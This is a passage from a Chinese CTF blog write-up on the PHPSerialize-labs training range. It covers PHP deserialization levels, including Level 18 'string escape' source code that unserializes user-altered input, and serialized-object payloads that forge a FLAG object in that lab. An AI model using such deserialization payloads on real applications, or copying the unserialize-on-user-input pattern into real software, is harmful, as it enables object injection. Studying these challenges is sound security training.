<p>那给出的挑战的判断是：如果反序列化后的对象是A的实例，并且具有属性helloctfcmd且值为”get_flag”，则输出flag。</p>
<p>所以直接实例化一个含有$helloctfcmd &#x3D; “get_flag”的 类A 就行了， exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$helloctfcmd</span> = <span class="string">&quot;get_flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();A</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="comment">//输出：O:1:&quot;A&quot;:1:&#123;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756113457241-e73a88f8-d91d-473c-91f1-43a0804c557c.png"></p>
<h1 id="Level18-字符串逃逸基础"><a href="#Level18-字符串逃逸基础" class="headerlink" title="Level18 : 字符串逃逸基础"></a>Level18 : 字符串逃逸基础</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 18 : 字符串逃逸基础 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">序列化和反序列化的规则特性,字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 &quot;;&#125;&quot; 作为字符串的结尾判定。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;GET_FLAG&quot;;&#125;FAKE_FLAG&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringDemo</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="variable">$change</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;change&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringFLAG</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$target</span>, <span class="variable">$change</span>, <span class="variable">$serliseStringDemo</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseStringFLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$FLAG</span> <span class="keyword">instanceof</span> FLAG &amp;&amp; <span class="variable">$FLAG</span>-&gt;key == <span class="string">&#x27;GET_FLAG&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">SerliseStringDemo:&#x27;O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;&#125;FAKE_FLAG&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">Change SOMETHING TO GET FLAGYour serliaze string is O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;&#125;FAKE_FLAG&quot;;&#125;</span></span><br><span class="line"><span class="comment">And Here is object(Demo)#1 (3) &#123; [&quot;a&quot;]=&gt; string(5) &quot;Hello&quot; [&quot;b&quot;]=&gt; string(3) &quot;CTF&quot; [&quot;key&quot;]=&gt; string(20) &quot;GET_FLAG&quot;;&#125;FAKE_FLAG&quot; &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>序列化和反序列化的规则特性,字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 “;}” 作为字符串的结尾判定。</p>
<p>题目要求我们对 Demo 的序列化之后的字符串进行修改，看看 if 的要求 $FLAG 在 FLAG 类里面，并且 $FLAG-&gt;key &#x3D;&#x3D; ‘GET_FLAG’。不难发现 Demo 类里面的 $key 的值是 ”GET_FLAG”;}FAKE_FLAG“，结合提示，我们需要让 $key 里面的“ ;} ”作为序列化的结束标志。因此修改 Demo 为 FLAG 以及修改$key 的长度从 20 到 8 即可满足要求。</p>
<p>O:4:<strong>“Demo”</strong>:3:{s:1:”a”;s:5:”Hello”;s:1:”b”;s:3:”CTF”;s:3:”key”;s:<strong>20</strong>:”GET_FLAG”;}FAKE_FLAG”;}</p>
<p>变为</p>
<p>O:4:<strong>“FLAG”</strong>:3:{s:1:”a”;s:5:”Hello”;s:1:”b”;s:3:”CTF”;s:3:”key”;s:<strong>8</strong>:”GET_FLAG”;}FAKE_FLAG”;}</p>
<p>即满足要求</p>
<p>playload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?target=O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;GET_FLAG&quot;</span>;&#125;FAKE_FLAG<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">&amp;change=O:4:&quot;</span>FLAG<span class="string">&quot;:3:&#123;s:1:&quot;</span>a<span class="string">&quot;;s:5:&quot;</span>Hello<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:3:&quot;</span>CTF<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:8:&quot;</span>GET_FLAG<span class="string">&quot;;&#125;FAKE_FLAG&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756116654145-f0415323-4afe-4c58-9a4f-3db32a3aa588.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io">Fischl0527</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io/2025/08/25/%E7%9F%A5%E8%AF%86/PHPSerialize-labs/">https://fischl0527.github.io/2025/08/25/%E7%9F%A5%E8%AF%86/PHPSerialize-labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/PHPSerialize-labs.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2025/08/08/HelloWeb/BUUWEB/" title="BUUCTFWEB"><img class="cover" src="/img/cover/BUUCTFWEB.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">BUUCTFWEB</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2024/12/02/HelloWeb/PHP%E5%AD%A6%E4%B9%A0%E5%8F%8A%E7%BB%83%E4%B9%A0/" title="PHP学习及练习"><img class="cover" src="/img/cover/PHP%E5%AD%A6%E4%B9%A0%E5%8F%8A%E7%BB%83%E4%B9%A0.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-02</div><div class="info-item-2">PHP学习及练习</div></div></div></a><a class="pagination-related no-desc" href="/2025/01/23/HnuSecTraining/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="2025 Win 反序列化"><img class="cover" src="/img/cover/2025Win%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-23</div><div class="info-item-2">2025 Win 反序列化</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Fischl0527</div><div class="author-info-description">「在哪里去追寻意义。夜色已深，梦还活着。」</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Fischl0527"><i class="fab fa-github"></i><span>Fischl0527</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Fischl0527" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1587607874@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog. I am a CTFer. Welcome everyone!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-1-%E7%B1%BB%E7%9A%84%E5%AE%9E%E4%BE%8B%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Level-1 : 类的实例化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-2-%E5%AF%B9%E8%B1%A1%E4%B8%AD%E5%80%BC%E7%9A%84%E4%BC%A0%E9%80%92"><span class="toc-number">2.</span> <span class="toc-text">Level-2 : 对象中值的传递</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-3-%E5%AF%B9%E8%B1%A1%E4%B8%AD%E5%80%BC%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text">Level-3 : 对象中值的权限</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-4-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">Level-4 : 序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-5-%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%84%E5%88%99"><span class="toc-number">5.</span> <span class="toc-text">Level-5 : 序列化规则</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-6-%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%84%E5%88%99-%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0"><span class="toc-number">6.</span> <span class="toc-text">Level-6 : 序列化规则_权限修饰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-7-%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">Level-7 : 实例化和反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-8-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%92%8C%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8AGC%E6%9C%BA%E5%88%B6"><span class="toc-number">8.</span> <span class="toc-text">Level-8 : 构造函数和析构函数以及GC机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-9-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E5%90%8E%E9%97%A8"><span class="toc-number">9.</span> <span class="toc-text">Level-9 : 构造函数的后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level10-weakup"><span class="toc-number">10.</span> <span class="toc-text">Level10 : weakup!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level11-Bypass-weakup"><span class="toc-number">11.</span> <span class="toc-text">Level11 : Bypass weakup!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level12-sleep"><span class="toc-number">12.</span> <span class="toc-text">Level12 : sleep!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level13-toString"><span class="toc-number">13.</span> <span class="toc-text">Level13 : __toString()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level14-invoke"><span class="toc-number">14.</span> <span class="toc-text">Level14 : __invoke()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level15-POP%E9%93%BE%E5%88%9D%E6%AD%A5"><span class="toc-number">15.</span> <span class="toc-text">Level15 : POP链初步</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level16-zePOP"><span class="toc-number">16.</span> <span class="toc-text">Level16 : zePOP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level17-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%9F%BA%E7%A1%80"><span class="toc-number">17.</span> <span class="toc-text">Level17 : 字符串逃逸基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level18-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%9F%BA%E7%A1%80"><span class="toc-number">18.</span> <span class="toc-text">Level18 : 字符串逃逸基础</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/08/25/%E7%9F%A5%E8%AF%86/PHPSerialize-labs/" title="PHPSerialize-labs"><img src="/img/cover/PHPSerialize-labs.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHPSerialize-labs"/></a><div class="content"><a class="title" href="/2025/08/25/%E7%9F%A5%E8%AF%86/PHPSerialize-labs/" title="PHPSerialize-labs">PHPSerialize-labs</a><time datetime="2025-08-25T03:45:14.000Z" title="Created 2025-08-25 11:45:14">2025-08-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/08/HelloWeb/BUUWEB/" title="BUUCTFWEB"><img src="/img/cover/BUUCTFWEB.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTFWEB"/></a><div class="content"><a class="title" href="/2025/08/08/HelloWeb/BUUWEB/" title="BUUCTFWEB">BUUCTFWEB</a><time datetime="2025-08-08T03:45:14.000Z" title="Created 2025-08-08 11:45:14">2025-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/04/2025CTF/2025%20SWPU-NSSCTF/" title="2025SWPU-NSSCTFwp"><img src="/img/cover/2025SWPU-NSSCTFwp.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025SWPU-NSSCTFwp"/></a><div class="content"><a class="title" href="/2025/08/04/2025CTF/2025%20SWPU-NSSCTF/" title="2025SWPU-NSSCTFwp">2025SWPU-NSSCTFwp</a><time datetime="2025-08-04T03:45:14.000Z" title="Created 2025-08-04 11:45:14">2025-08-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp"><img src="/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025御网杯wp"/></a><div class="content"><a class="title" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp">2025御网杯wp</a><time datetime="2025-05-11T03:45:14.000Z" title="Created 2025-05-11 11:45:14">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF"><img src="/img/cover/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="十六届蓝桥杯CTF"/></a><div class="content"><a class="title" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF">十六届蓝桥杯CTF</a><time datetime="2025-04-26T03:45:14.000Z" title="Created 2025-04-26 11:45:14">2025-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp"><img src="/img/cover/2025sqCTF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025sqCTFwp"/></a><div class="content"><a class="title" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp">2025sqCTFwp</a><time datetime="2025-04-04T03:45:14.000Z" title="Created 2025-04-04 11:45:14">2025-04-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Fischl0527</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>